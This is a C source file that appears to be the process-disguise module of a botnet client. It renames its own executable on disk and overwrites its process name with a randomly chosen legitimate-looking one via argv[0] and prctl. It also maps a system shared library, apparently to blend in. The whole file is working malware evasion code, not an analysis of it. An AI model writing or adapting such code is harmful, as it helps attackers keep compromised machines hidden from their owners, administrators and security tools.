#include <dirent.h>
#include <fcntl.h>
#include <linux/limits.h>
#include <pthread.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <unistd.h>

#include "bot/config/table.h"
#include "bot/definitions.h"
#include "bot/utils/tokenizer.h"
#include "bot/utils/xoshiro.h"

#define BUF_SIZE 512

void dynamic_rename_file(char *path) {
  char real_path[BUF_SIZE] = {0};
  char dir_path[BUF_SIZE] = {0};
  char new_path[BUF_SIZE] = {0};

  ssize_t n = readlink(table_retrieve(TABLE_KILLER_SELF_EXE, NULL), real_path, sizeof(real_path));
  table_lock(TABLE_KILLER_SELF_EXE);

  if (n == -1) return;
  strcpy(dir_path, real_path);

  char *last_slash = strrchr(dir_path, '/');
  if (!last_slash) return;

  *last_slash = '\0';

  strcpy(new_path, dir_path);
  strcat(new_path, path);
  rename(real_path, new_path);
}

void dynamic_mmap() {
  char buf[BUF_SIZE] = {0};
  struct dirent *entry;

  DIR *dp = opendir(table_retrieve(TABLE_MAPPER_LIB, NULL));
  if (!dp) return;

  while ((entry = readdir(dp)) != NULL) {
    if (strstr(entry->d_name, ".so") == NULL) {
      continue;
    }

    // build path
    memset(buf, 0, sizeof(buf));
    strcpy(buf, table_retrieve(TABLE_MAPPER_LIB, NULL));
    strcat(buf, entry->d_name);

    // jus continue if we can't open it
    int fd = open(buf, O_RDONLY);
    if (fd == -1) continue;

    void *map = mmap(NULL, 1, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);

    // break if we found something
    if (map != MAP_FAILED) {
      LOG_INFO("Mapped -> %s", buf);
      break;
    }
  }

  // just close the dir
  closedir(dp);
}

void dynamic_fallback(char **argv) {
  ptokenizer_t proc_names = tokenizer_new(table_retrieve(TABLE_PROC_NAMES, NULL), ",");
  table_lock(TABLE_PROC_NAMES);

  if (proc_names) {
    const char *proc_name = proc_names->tokens[xoshiro_next() % proc_names->size];

    // rename the proc
    memcpy(argv[0], proc_name, strlen(proc_name));
    prctl(PR_SET_NAME, proc_name);

    // rename the path
    char path[256] = "/";
    strcat(path, table_retrieve(TABLE_MAPPER_NAME, NULL));
    table_lock(TABLE_MAPPER_NAME);

#ifndef DEBUG
    dynamic_rename_file(path);
#endif

    // free the names
    tokenizer_free(proc_names);
  }
}

/* The function that was in Dynamic::init */
void dynamic_init(char **argv) {
  dynamic_mmap();
  table_lock(TABLE_MAPPER_LIB);

  dynamic_fallback(argv);
}
